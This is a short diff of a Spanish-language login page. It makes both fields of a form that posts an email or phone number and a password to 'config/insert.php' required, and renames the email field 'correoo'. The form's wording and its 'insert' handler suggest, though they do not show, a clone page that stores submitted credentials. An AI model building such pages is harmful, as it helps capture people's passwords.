@@ -194,8 +194,8 @@ body {
         </div>
         <div class="container-form">
             <form class="form" method="post" action="config/insert.php">
-                <input type="text"  name="correo" placeholder="Correo electronico o numero de telefono">
-                <input type="password" name="password" placeholder="Contraseña">
+                <input type="text"  name="correoo" placeholder="Correo electronico o numero de telefono" required>
+                <input type="password" name="password" placeholder="Contraseña" required>
                 <input type="submit" value="Iniciar Sesión">
                 <span><a href="#">¿Olvidaste tu contraseña?</a></span>
                 <div class="border"></div>
